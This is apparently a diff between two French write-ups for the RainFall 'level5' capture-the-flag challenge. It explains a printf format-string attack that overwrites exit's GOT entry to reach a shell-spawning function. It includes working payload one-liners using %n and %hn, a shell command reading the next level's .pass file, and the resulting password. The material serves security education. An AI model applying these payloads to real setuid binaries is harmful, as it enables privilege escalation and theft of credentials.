@@ -1,100 +1,44 @@
-Nous avons un binaire **./level5**
-COmmencons par voir les appels aux fonctions:
-```sh
-level5@RainFall:~$ ltrace ./level5
-__libc_start_main(0x8048504, 1, 0xbffff7f4, 0x8048520, 0x8048590 <unfinished ...>
-fgets(%p%p%p%p%p%p%p%p%p%p%p%p%p%p
-"%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n", 512, 0xb7fd1ac0)      = 0xbffff540
-printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n", 0x200, 0xb7fd1ac0, 0xb7ff37d0, 0x70257025, 0x70257025, 0x70257025, 0x70257025, 0x70257025, 0x70257025, 0x70257025, 0xa, (nil), 0xb7fde000, 0xb7fff53c0x2000xb7fd1ac00xb7ff37d00x702570250x702570250x702570250x702570250x702570250x702570250x702570250xa(nil)0xb7fde0000xb7fff53c
-) = 124
-exit(1 <unfinished ...>
-+++ exited (status 1) +++
-```
-level5 fini par un exit visiblement avant d'arriver à la fin du programme. On remarque qu'il y a un appel à printf et que printf est vulnérable à l'exploit de format, cherchons l'index: 
-```sh
-level5@RainFall:~$ ./level5
-aaaa%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
-aaaa0x2000xb7fd1ac00xb7ff37d00x616161610x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250xbfff000a0x400xb80(nil)0xb7fde7140x98
-```
-C'est a l'index 4 que nous retrouvons notre chaîne "aaaa" : 0x61616161.
-Passons au désassemblage:
+﻿Tout comme dans les deux exercices precedents, on va devoir jouer avec printf.
+Ici on va vouloir rediriger l'execution de la fonction exit vers la fonction 'o'.
 
-```asm
-level5@RainFall:~$ objdump ./level5 -d -M intel
+En testant je vois que le debut du buffer est au 4eme argument de printf.
 
-./level5:     file format elf32-i386
+Video interessante sur le sujet: [Global Offset Table (GOT) and Procedure Linkage Table (PLT) - Binary Exploitation PWN101](https://www.youtube.com/watch?v=B4-wVdQo040)
 
-Disassembly of section .init:
-...
-080483d0 <exit@plt>:
- 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
- 80483d6:       68 28 00 00 00          push   $0x28
- 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>
- ...
-080484a4 <o>:
- 80484a4:       55                      push   ebp
- 80484a5:       89 e5                   mov    ebp,esp
- 80484a7:       83 ec 18                sub    esp,0x18
- 80484aa:       c7 04 24 f0 85 04 08    mov    DWORD PTR [esp],0x80485f0
- 80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
- 80484b6:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
- 80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>
+En debug avec gdb, on voit que le premier appel de 'exit' renvoie dans la section .plt (RX), 
+qui fait un jump vers .got.plt (RW) qui contient l'addresse reelle de la fonction exit.  
 
-080484c2 <n>:
- 80484c2:       55                      push   ebp
- 80484c3:       89 e5                   mov    ebp,esp
- 80484c5:       81 ec 18 02 00 00       sub    esp,0x218
- 80484cb:       a1 48 98 04 08          mov    eax,ds:0x8049848
- 80484d0:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
- 80484d4:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
- 80484db:       00
- 80484dc:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
- 80484e2:       89 04 24                mov    DWORD PTR [esp],eax
- 80484e5:       e8 b6 fe ff ff          call   80483a0 <fgets@plt>
- 80484ea:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
- 80484f0:       89 04 24                mov    DWORD PTR [esp],eax
- 80484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
- 80484f8:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
- 80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt>
+INFO: Au premier appel d'une fonction d'une librairie linkee dynamiquement, l'addresse dans .got.plt renvoie vers 
+la section .plt qui va appeler le linker dynamiquement pour obtenir l'addresse de la fonction et la stocker dans .got.plt.
+Ainsi tous les futurs appels de la fonction iront directement a la bonne addresse et n'appeleront plus le linker.
 
-08048504 <main>:
- 8048504:       55                      push   ebp
- 8048505:       89 e5                   mov    ebp,esp
- 8048507:       83 e4 f0                and    esp,0xfffffff0
- 804850a:       e8 b3 ff ff ff          call   80484c2 <n>
- 804850f:       c9                      leave
- 8048510:       c3                      ret
- 8048511:       90                      nop
-...
-```
-Plusieurs choses:
-- **main** appel **n** qui appelle **fgets** avec un buffer de 512 octets puis **printf**
-- **n** appelle **exit**
-- il y a une fonction **o** qui appelle system chargé avec le buffer "/bin/sh" -> c'est évidemment notre cible
-```sh
-level5@RainFall:~$ gdb -q ./level5
-Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
-(gdb) x/s 0x80485f0
-0x80485f0:       "/bin/sh"
-```
-- **o** n'a pas de protection particulière conditionnant son accès, un jump dans gdb permet d'y accéder, mais il nous faut les droits level6
+On va donc vouloir ecraser l'addresse de exit dans .got.plt avec l'addresse de la fonction 'o'.
+Et cela en utilisant '%n' de printf pour ecrire un nombre a une addresse donnee.
 
-Il faut donc contourner l'appel a **exit** de **n** pour appeler **o** à la place.
-On a vu au précédant hack qu'avec le format **%n** il était possible d'écrire des valeurs à une adresse. Il faudrait donc écraser l'adresse d'**exit** pour la remplacer par celle de **o**.
-L'adresse de **o** est **0x080484a4**, celle d'**exit** est **0x8049838**.
-> L'adresse de exit issue de la libc change à chaque fois si ASLR est activé, on sait que non dû au message d'accueil du level5, mais on peut vérifier comme ceci:
+On peut donc dors et deja convertir l'addresse de 'o' en decimal pour avoir le bon nombre de bytes ecrits.  
+0x80484a4 => 134513828 en decimal.
+
+Il nous faut aussi l'addresse ou ecrire ce nombre. Avec gdb je vois que .plt fait un jump vers ds:0x8049838
+On va donc ecrire dans cette addresse.
+0x8049838 => '\x38\x98\x04\x08'
+
+## Solution 1
+
+On peut donc faire notre exploit:
+1. [4] Dans le buffer on met l'addresse de 'o'
+2. [4 + 8*2 = 20] On print 2 fois '%x' pour utiliser 2 arguments de la stack
+3. [20 + 134513808] On print 134513808 characteres + on utilise un argument de la stack
+4. [134513828] On print '%n' pour ecrire le nombre de characteres print dans l'addresse de exit
+
 ```bash
-level5@RainFall:~$ ldd ./level5
-        linux-gate.so.1 =>  (0xb7fff000)
-        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
-        /lib/ld-linux.so.2 (0x80000000)
-level5@RainFall:~$ for i in `seq 0 4`; do ldd ./level5 | grep libc; done
-        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
-        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
-        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
-        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
+level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%8x'*2 + '%134513808x' + '%n'" > /tmp/payload5
+level5@RainFall:~$ cat /tmp/payload5 - | ./level5
+                             200
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
-> On voit que l'adresse **0xb7e4e000** ne change pas.
+
+## Solution 2
 
 L'adresse de o représente un nombre gigantesque pour être écrit par printf en nombre de caractère, potentiellement cela peut crasher. Nous allons donc écrire l'adresse en deux fois à l'aide de 2 * 2 octets au lieu de 4 octets d'un coup en séparant lower bytes et higher bytes (LOB et HOB) à l'aide de %hn qui n'écrit que le LOB de l'int pointé par %n:
 
@@ -121,3 +65,4 @@ cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 Flag!
+
